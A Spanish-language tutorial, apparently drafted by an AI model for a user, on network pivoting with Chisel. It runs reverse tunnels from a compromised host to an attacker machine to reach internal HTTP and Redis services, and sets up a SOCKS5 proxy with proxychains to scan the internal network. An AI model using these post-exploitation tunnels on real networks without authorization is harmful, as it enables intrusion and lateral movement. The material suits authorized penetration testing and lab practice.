Perfecto, Jorge. Vamos a actualizar el post incluyendo la configuración de **Proxychains** para que quede completo y funcional.
# Pivoting con Chisel

## Introducción

[Chisel](https://github.com/jpillora/chisel) es una herramienta escrita en Go que permite crear **túneles TCP/SOCKS reversos** y forwardings de puertos, ideal para pivoting dentro de una red comprometida.
Permite que un atacante exponga puertos internos de la red víctima a su máquina de forma sencilla, evitando la necesidad de abrirlos directamente al exterior.

---

## Instalación

Primero clonamos el repositorio y compilamos.
En este caso, como **la versión de glibc en la máquina destino estaba desactualizada**, usamos `CGO_ENABLED=0` para asegurar la compatibilidad:

```bash
git clone https://github.com/jpillora/chisel
cd chisel
CGO_ENABLED=0 go build -a -ldflags="-s -w" .
upx chisel  # Opcional, para reducir el binario
```

> Esto genera el binario `chisel`, listo para usarse en servidores y clientes.

---

## Uso Básico

Chisel funciona en **modo servidor** (atacante) y **modo cliente** (víctima).

### Servidor (Máquina Host)

```bash
sudo ./chisel server --reverse -p 1234
```

* `sudo` es necesario si vas a mapear puertos <1024, aunque no siempre obligatorio.
* `--reverse` habilita la recepción de conexiones desde clientes que hacen tunelado reverso.
* `-p 1234` define el puerto donde escuchará el servidor.

### Cliente (Máquina Pwned que queremos usar como puente)

```bash
./chisel client <IP_DEL_SERVIDOR>:1234 R:<PUERTO_LOCAL>:<IP_INTERNA>:<PUERTO_REMOTO>
```

* `R:` indica que es un **tunel reverso**.
* `<PUERTO_LOCAL>` es el puerto en tu máquina atacante donde se expondrá el servicio.
* `<IP_INTERNA>:<PUERTO_REMOTO>` es el destino real en la red interna.

> Ejemplo de error común:
> Si ves mensajes como `Server cannot listen on R:80=>172.19.0.4:80`, es probable que necesites **root** para abrir puertos <1024 en tu máquina.

---

## Ejemplo Pivoting Simple: HTTP/80

Si queremos mapear el puerto HTTP interno de la víctima (`172.19.0.4:80`) a nuestro puerto local:

### Servidor

```bash
sudo ./chisel server --reverse -p 1234
```

### Cliente (Pwned)

```bash
./chisel client 10.10.14.3:1234 R:80:172.19.0.4:80
```

* Ahora `http://localhost:80` en tu máquina atacante apuntará al servidor web interno de la víctima.

---

## Ejemplo Pivote Simple Redis: puerto 6379

Supongamos que hay un Redis interno en `172.19.0.4:6379` y queremos mapearlo a nuestro `localhost:8080`.

### Servidor

```bash
sudo ./chisel server --reverse -p 1234
```

### Cliente (Pwned)

```bash
./chisel client 10.10.14.3:1234 R:8080:172.19.0.4:6379
```

* Ahora podemos conectar desde nuestra máquina atacante usando:

```bash
redis-cli -p 8080
```

> **Explicación:**
> `R:8080:172.19.0.4:6379` → túnel reverso desde el puerto interno 6379 al puerto 8080 de nuestra máquina.

---

## Pivoting con SOCKS y Proxychains

Chisel permite levantar un **proxy SOCKS5** para pivotar todo tipo de tráfico TCP:

### Servidor

```bash
sudo ./chisel server --reverse -p 1234
```

### Cliente (víctima) con SOCKS

```bash
./chisel client 10.10.14.3:1234 R:socks
```

* Esto levanta un **proxy SOCKS5** en el puerto por defecto del servidor (1080), que puedes usar con herramientas como `proxychains`.

### Configuración de Proxychains

En `/etc/proxychains.conf` o `~/.proxychains/proxychains.conf` añade o modifica la línea del final:

```ini
# socks5 <IP_PROXY> <PUERTO>
socks5 127.0.0.1 1080
```

* Esto indica que todo el tráfico de Proxychains pasará por el SOCKS5 levantado por Chisel.

### Uso con Proxychains

```bash
proxychains curl http://172.19.0.4:80
proxychains nmap -p 1-1000 172.19.0.4
```

* Todo el tráfico será redirigido a través del túnel de la víctima, permitiendo explorar la red interna de manera segura.

---

## Notas y recomendaciones

* Siempre usar `CGO_ENABLED=0` si la máquina destino tiene Go antiguo.
* Para puertos <1024 es necesario **root**.
* Puedes mapear cualquier servicio TCP interno: HTTP, Redis, SMB, bases de datos, etc.
* Chisel es ligero y portable, ideal para pruebas rápidas de pivoting.
* Usar SOCKS + Proxychains permite pivoting **transparente para casi cualquier herramienta**.
